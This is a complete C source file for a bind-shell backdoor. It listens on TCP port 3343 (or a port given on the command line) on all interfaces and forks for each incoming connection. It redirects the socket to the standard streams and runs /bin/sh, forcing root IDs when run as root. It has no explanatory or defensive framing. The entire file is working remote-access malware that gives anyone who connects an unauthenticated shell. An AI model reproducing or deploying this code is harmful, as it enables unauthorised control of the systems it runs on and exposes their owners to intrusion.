#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

char port[6] = "3343";
char exe_path[255] = "/bin/sh";
char exe_arg0[50] = "sh";

void spawn(int fd) {
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    if (geteuid() == 0){
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
    }
    execl(exe_path, exe_arg0, NULL, NULL, NULL);
}

int main(int argc, char* argv[]) {
    int socket_fd, connect_fd, iport;
    struct sockaddr_in servaddr;

    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("create socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    if(argc>=2){
        iport = atoi(argv[1]);
    }else{
        iport = atoi(port);
    }
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(iport);

    if (bind(socket_fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) == -1) {
        printf("bind socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    if (listen(socket_fd, 10) == -1) {
        printf("listen socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    while (1) {
        if ((connect_fd = accept(socket_fd, (struct sockaddr *) NULL, NULL)) == -1) {
            printf("accept socket error: %s(errno: %d)", strerror(errno), errno);
            exit(0);
        }
        int pid = fork();
        if(pid == -1) {
            exit(0);
        }
        if (!pid) {
            spawn(connect_fd);
            exit(0);
        }
        close(connect_fd);
    }
    close(socket_fd);
}
